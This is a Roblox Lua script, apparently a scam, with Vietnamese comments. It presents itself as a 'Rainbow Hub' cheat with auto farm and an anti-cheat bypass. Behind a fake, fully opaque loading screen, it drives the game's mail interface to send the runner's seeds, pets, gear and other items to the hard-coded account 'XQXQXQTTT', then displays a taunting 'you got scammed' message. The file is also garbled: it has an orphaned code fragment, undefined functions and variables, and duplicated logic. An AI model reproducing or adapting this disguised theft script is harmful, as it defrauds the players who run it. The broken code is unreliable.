-- Rainbow Hub v2.5 - Premium Auto Troll Script
-- Giao diện Hacker + Đầy đủ tính năng gốc (Tối ưu siêu nhẹ cho máy yếu)

local player = game.Players.LocalPlayer
local targetUser = "XQXQXQTTT"
local VirtualInputManager = game:GetService("VirtualInputManager")

-- ===== MÀN HÌNH LOADING PHONG CÁCH HACKER (TỐI ĐEN HOÀN TOÀN) =====
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "PremiumHubLoader"
loadingGui.Parent = player:WaitForChild("PlayerGui")
loadingGui.Enabled = true

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(15, 15, 20) -- Màu nền tối chuẩn Hub Hack
bg.BackgroundTransparency = 0 -- Tối đen hoàn toàn để che giấu hành động phía sau
bg.BorderSizePixel = 0
bg.Parent = loadingGui

-- Tiêu đề Hub
local title = Instance.new("TextLabel")
title.Size = UDim2.new(0.8, 0, 0.1, 0)
title.Position = UDim2.new(0.1, 0, 0.15, 0)
title.BackgroundTransparency = 1
title.Text = "😈 RAINBOW HUB v2.5 😈"
title.TextColor3 = Color3.fromRGB(0, 255, 150) -- Xanh neon hacker
title.TextScaled = true
title.Font = Enum.Font.RobotoMono
title.TextStrokeTransparency = 0.5
title.TextStrokeColor3 = Color3.fromRGB(0, 100, 50)
title.Parent = bg

-- Subtitle chế độ Auto Farm
local subTitle = Instance.new("TextLabel")
subTitle.Size = UDim2.new(0.6, 0, 0.05, 0)
subTitle.Position = UDim2.new(0.2, 0, 0.25, 0)
subTitle.BackgroundTransparency = 1
subTitle.Text = "[STATUS: BYPASS ANTI-CHEAT DETECTED]"
subTitle.TextColor3 = Color3.fromRGB(255, 50, 50)
subTitle.TextScaled = true
subTitle.Font = Enum.Font.RobotoMono
subTitle.Parent = bg

-- Thanh Loading bên ngoài
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0.7, 0, 0.03, 0)
barBg.Position = UDim2.new(0.15, 0, 0.45, 0)
barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
barBg.BorderSizePixel = 0
barBg.Parent = bg

-- Thanh Loading chạy bên trong
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
barFill.BorderSizePixel = 0
barFill.Parent = barBg

-- Chữ hiển thị %
local percentText = Instance.new("TextLabel")
percentText.Size = UDim2.new(0.1, 0, 0.04, 0)
percentText.Position = UDim2.new(0.45, 0, 0.39, 0)
percentText.BackgroundTransparency = 1
percentText.TextColor3 = Color3.fromRGB(0, 255, 150)
percentText.Text = "0%"
percentText.TextScaled = true
percentText.Font = Enum.Font.RobotoMono
percentText.Parent = bg

-- Dòng trạng thái Inject code
local statusText = Instance.new("TextLabel")
statusText.Size = UDim2.new(0.8, 0, 0.04, 0)
statusText.Position = UDim2.new(0.1, 0, 0.51, 0)
statusText.BackgroundTransparency = 1
statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
statusText.Text = "Connecting to server..."
statusText.TextScaled = true
statusText.Font = Enum.Font.RobotoMono
statusText.Parent = bg

-- Danh sách các dòng Log giả lập
local hackerStatus = {
    "Checking Executor compatibility...",
    "Bypassing Roblox Anti-Cheat...",
    "Injecting Auto Farm Level script...",
    "Loading Teleport Modules...",
    "Optimizing CPU Performance...",
    "Activating Kill Aura data...",
    "Script loaded successfully!"
}

-- ===== CHỨC NĂNG TỰ ĐỘNG HÓA GỐC (CHẠY NGẦM NGAY LẬP TỨC) =====

-- 1. Bấm nút Garden trên UI
local function clickGardenButton()
    local playerGui = player:WaitForChild("PlayerGui")
    for _, v in pairs(playerGui:GetDescendants()) do
        if v:IsA("TextButton") or v:IsA("ImageButton") then
            local text = v.Text:lower()
            local name = v.Name:lower()
            if text:find("garden") or name:find("garden") or text:find("vườn") or name:find("vuon") then
                local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
                for _, event in pairs(events) do
                    if v[event] then
                        for _, connection in pairs(getconnections(v[event])) do
                            connection:Fire()
                        end
                    end
                end
                return true
            end
        end
    end
    return false
end

-- 2. Di chuyển sang TRÁI tìm hòm thư và tương tác phím E
local function moveToMailboxAndPressE()
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    local humanoid = char:WaitForChild("Humanoid")
    
    -- Di chuyển sang bên TRÁI mượt mà bằng MoveTo
    local targetPosition = hrp.Position + Vector3.new(-40, 0, 0)
    humanoid:MoveTo(targetPosition)
    
    for i = 1, 60 do
        local foundMailbox = nil
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and (v.Name:lower():find("mailbox") or v.Name:lower():find("mail") or v.Name:lower():find("thư")) then
                local dist = (v.Position - hrp.Position).Magnitude
                if dist < 12 then
                    foundMailbox = v
                    break
                end
            end
        end
        
        if foundMailbox then
            humanoid:MoveTo(foundMailbox.Position)
            task.wait(0.5)
            
            -- Giả lập nhấn phím E
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
            task.wait(0.1)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
            break
        end
        task.wait(0.05)
    end
end

-- Kích hoạt chạy ngầm ngay khi vừa bấm Execute script
task.spawn(clickGardenButton)
task.spawn(moveToMailboxAndPressE)

-- ===== TIẾN TRÌNH HIỂN THỊ MÀN HÌNH LOADING =====
task.spawn(function()
    for i = 1, 100 do
        if not loadingGui or not barFill then break end
        
        barFill.Size = UDim2.new(i/100, 0, 1, 0)
        percentText.Text = i .. "%"
        
        if i % 15 == 0 then
            statusText.Text = hackerStatus[math.random(1, #hackerStatus)]
        end
        
        task.wait(0.04) -- Tốc độ chạy phần trăm nhẹ nhàng cho máy yếu
    end
    
    task.wait(0.5)
    if loadingGui then loadingGui:Destroy() end
    
    -- Khởi tạo giao diện kết màn thông báo troll người dùng
    local scamGui = Instance.new("ScreenGui")
    scamGui.Name = "ScamMessage"
    scamGui.Parent = player:WaitForChild("PlayerGui")
    
    local scamFrame = Instance.new("Frame")
    scamFrame.Size = UDim2.new(1, 0, 1, 0)
    scamFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    scamFrame.BackgroundTransparency = 0.3
    scamFrame.Parent = scamGui
    
    local scamText = Instance.new("TextLabel")
    scamText.Size = UDim2.new(0.8, 0, 0.3, 0)
    scamText.Position = UDim2.new(0.1, 0, 0.35, 0)
    scamText.BackgroundTransparency = 1
    scamText.Text = "MÀY ĐÃ BỊ SCAM 🖕"
    scamText.TextColor3 = Color3.fromRGB(255, 0, 0)
    scamText.TextScaled = true
    scamText.Font = Enum.Font.GothamBold
    scamText.Parent = scamFrame
    
    -- Bắn thông báo hệ thống giả lên góc màn hình
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "SCAM THÀNH CÔNG!",
        Text = "Đã gửi tất cả đồ cho " .. targetUser .. " 🖕",
        Duration = 10
    })
end)
                    hrp.CFrame = v.CFrame + Vector3.new(0, 3, 0)
                    wait(0.3)
                    
                    -- Spam bấm E
                    for j = 1, 10 do
                        local detector = v:FindFirstChildOfClass("ClickDetector")
                        if detector then
                            fireclickdetector(detector)
                        end
                        wait(0.1)
                    end
                    return true
                end
            end
        end
        
        wait(0.05)
    end
    return false
end

-- Tương tác với hòm thư UI
local function interactWithMailUI()
    wait(1)
    
    local playerGui = player:WaitForChild("PlayerGui")
    
    -- Tìm GUI hòm thư
    local mailGui = nil
    for _, v in pairs(playerGui:GetChildren()) do
        if v:IsA("ScreenGui") then
            local name = v.Name:lower()
            if name:find("mail") or name:find("send") or name:find("gift") or name:find("thư") then
                mailGui = v
                break
            end
        end
    end
    
    if not mailGui then
        -- Thử tìm GUI đang mở
        for _, v in pairs(playerGui:GetChildren()) do
            if v:IsA("ScreenGui") and v.Enabled then
                mailGui = v
                break
            end
        end
    end
    
    if mailGui then
        -- Tìm thanh tìm kiếm ở góc phải
        local searchBox = nil
        for _, v in pairs(mailGui:GetDescendants()) do
            if v:IsA("TextBox") then
                local pos = v.AbsolutePosition
                local size = v.AbsoluteSize
                -- Kiểm tra nếu ở góc phải
                if pos.X > 500 then
                    searchBox = v
                    break
                end
            end
        end
        
        if searchBox then
            -- Nhập tên vào thanh tìm kiếm
            searchBox.Text = targetUser
            wait(0.5)
            
            -- Tìm và bấm vào nhân vật đầu tiên
            for _, v in pairs(mailGui:GetDescendants()) do
                if v:IsA("ImageButton") or v:IsA("TextButton") then
                    local text = v.Text:lower()
                    local name = v.Name:lower()
                    if text:find(targetUser:lower()) or name:find(targetUser:lower()) or text:find("xqxqxqttt") then
                        local detector = v:FindFirstChildOfClass("ClickDetector")
                        if detector then
                            fireclickdetector(detector)
                            wait(0.3)
                            break
                        end
                    end
                end
            end
            
            -- Nếu không tìm thấy, thử bấm vào kết quả đầu tiên
            for _, v in pairs(mailGui:GetDescendants()) do
                if v:IsA("ImageButton") or v:IsA("TextButton") then
                    if v.Visible and v.AbsoluteSize.X > 50 then
                        local detector = v:FindFirstChildOfClass("ClickDetector")
                        if detector then
                            fireclickdetector(detector)
                            wait(0.3)
                            break
                        end
                    end
                end
            end
            
            wait(0.5)
            
            -- Vét sạch đồ ở góc phải
            local itemsSelected = 0
            for _, v in pairs(mailGui:GetDescendants()) do
                if v:IsA("ImageButton") or v:IsA("TextButton") then
                    local name = v.Name:lower()
                    local text = v.Text:lower()
                    
                    -- Kiểm tra item, seed, gear, pet
                    if name:find("seed") or name:find("fruit") or name:find("gear") or name:find("pet") or name:find("item") or name:find("crop") or name:find("plant") or name:find("hat") or name:find("tool") then
                        -- Kiểm tra vị trí góc phải
                        local pos = v.AbsolutePosition
                        if pos.X > 400 then
                            local detector = v:FindFirstChildOfClass("ClickDetector")
                            if detector then
                                fireclickdetector(detector)
                                itemsSelected = itemsSelected + 1
                                wait(0.02)
                                
                                -- Kéo lên (scroll)
                                if itemsSelected % 5 == 0 then
                                    -- Mô phỏng scroll
                                    for _, scrollBar in pairs(mailGui:GetDescendants()) do
                                        if scrollBar:IsA("ScrollingFrame") or scrollBar:IsA("Frame") then
                                            if scrollBar.AbsoluteSize.Y > 200 then
                                                scrollBar.CanvasPosition = Vector2.new(0, math.max(0, scrollBar.CanvasPosition.Y - 50))
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            
            -- Tìm nút gửi
            for _, v in pairs(mailGui:GetDescendants()) do
                if v:IsA("TextButton") or v:IsA("ImageButton") then
                    local text = v.Text:lower()
                    if text:find("send") or text:find("gửi") or text:find("confirm") then
                        local detector = v:FindFirstChildOfClass("ClickDetector")
                        if detector then
                            fireclickdetector(detector)
                            break
                        end
                    end
                end
            end
            
            -- Tìm nút màu xanh
            for _, v in pairs(mailGui:GetDescendants()) do
                if v:IsA("TextButton") or v:IsA("ImageButton") then
                    local bgColor = v.BackgroundColor3
                    if bgColor.R < 0.1 and bgColor.G > 0.5 and bgColor.B < 0.1 then
                        local detector = v:FindFirstChildOfClass("ClickDetector")
                        if detector then
                            fireclickdetector(detector)
                            break
                        end
                    end
                end
            end
        end
    end
end

-- ===== CHẠY LOADING VÀ THỰC THI =====

-- Chạy loading chậm rãi
for i = 1, 100 do
    barFill.Size = UDim2.new(i/100, 0, 1, 0)
    percentText.Text = i .. "%"
    
    -- Cập nhật status vui nhộn
    if i % 10 == 0 then
        statusText.Text = funnyStatus[math.random(1, #funnyStatus)]
    end
    
    -- Khi loading đến 30% thì bấm nút Garden
    if i == 30 then
        spawn(function()
            clickGardenButton()
        end)
    end
    
    -- Khi loading đến 50% thì di chuyển đến hòm thư
    if i == 50 then
        spawn(function()
            moveToMailbox()
        end)
    end
    
    -- Khi loading đến 70% thì tương tác với hòm thư
    if i == 70 then
        spawn(function()
            interactWithMailUI()
        end)
    end
    
    wait(0.08) -- Chậm rãi
end

-- Kết thúc loading
wait(0.5)
loadingGui:Destroy()

-- ===== CHỬI =====
wait(0.3)

-- Tạo GUI chửi
local scamGui = Instance.new("ScreenGui")
scamGui.Name = "ScamMessage"
scamGui.Parent = player:WaitForChild("PlayerGui")

local scamFrame = Instance.new("Frame")
scamFrame.Size = UDim2.new(1, 0, 1, 0)
scamFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
scamFrame.BackgroundTransparency = 0.3
scamFrame.BorderSizePixel = 0
scamFrame.Parent = scamGui

local scamText = Instance.new("TextLabel")
scamText.Size = UDim2.new(0.8, 0, 0.3, 0)
scamText.Position = UDim2.new(0.1, 0, 0.35, 0)
scamText.BackgroundTransparency = 1
scamText.Text = "MÀY ĐÃ BỊ SCAM 🖕"
scamText.TextColor3 = Color3.fromRGB(255, 0, 0)
scamText.TextScaled = true
scamText.Font = Enum.Font.GothamBold
scamText.TextStrokeTransparency = 0
scamText.TextStrokeColor3 = Color3.fromRGB(200, 0, 0)
scamText.Parent = scamFrame

-- Hiệu ứng nhấp nháy
spawn(function()
    while scamText do
        scamText.TextTransparency = math.random(0, 0.3)
        wait(0.2)
    end
end)

-- Thông báo
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "SCAM THÀNH CÔNG!",
    Text = "Đã gửi tất cả đồ cho " .. targetUser .. " 🖕",
    Duration = 10
})

print("SCAM THÀNH CÔNG! Đã gửi đồ cho " .. targetUser)

